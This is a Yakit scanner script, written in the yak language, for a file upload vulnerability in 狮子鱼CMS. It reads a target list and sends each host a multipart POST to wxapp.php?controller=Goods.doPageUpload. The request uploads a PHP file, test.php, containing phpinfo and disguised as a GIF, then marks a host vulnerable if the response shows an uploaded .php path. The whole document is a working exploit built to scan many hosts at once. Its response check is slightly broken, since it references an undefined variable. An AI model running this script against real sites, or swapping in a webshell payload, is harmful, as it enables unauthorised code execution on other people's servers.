yakit.AutoInitYakit()
targets = cli.String("targets") 
targets = str.Split(targets, "\n") 
proxy = cli.String("proxy")
threads = cli.Int("threads")
cli.check()

def add_risk(url,token){
    risk.NewRisk(url,risk.title("狮子鱼CMS文件上传漏洞"),risk.details("文件上传漏洞"),risk.level("high"),risk.token(token.image_o))
}


def POC(opts,url){
    rsp, req, err := poc.HTTP(`
POST {{params(target)}}/wxapp.php?controller=Goods.doPageUpload HTTP/1.1
Host: {{params(host)}}
Content-Length: 210
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: image/gif

<?php phpinfo();?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
`, opts...,
)   
    headers, body = poc.Split(rsp)
    result = "image_o"
    result2 = ".php"
    result2 = "Uploads"
    token = json.loads(string(body))
    if str.Contains(string(body), result)&&str.Contains(string(body), result2)&&str.Contains(string(body), result3){
        yakit.Warn("【+】%s存在漏洞"%url)
        add_risk(url,token)
    }else {
        yakit.Info("【-】%s不存在漏洞"%url)
    }
}

def testlink(url){
    rsp,err = http.Get(url,
    http.timeout(3.0))
    if err == nil{
        if rsp !=""{
        if rsp.StatusCode == 200{
        return true
    } 
    }else {
        yakit.Info("请求%s失败"%url)
    }
    }  
}

def go_payload(url){
    urls = str.ParseStringToUrls(url)
    for i=0;i<len(urls);i++{
        if testlink(urls[i]){
            opts = []
            opts = append(opts, poc.params({"target":urls[i],"host":url}))
            if proxy!=""{
                opts = append(opts, poc.proxy(proxy))
            }
            opts = append(opts,poc.timeout(5.0))
            POC(opts,urls[i])
        }
    }

    }

def submittask(url){
    println(url)
        swg.Add()
        go fn{
            defer swg.Done()
            go_payload(url)
        }
}

swg = sync.NewSizedWaitGroup(threads)
for _,x = range targets{
    submittask(x) 
}

swg.Wait()
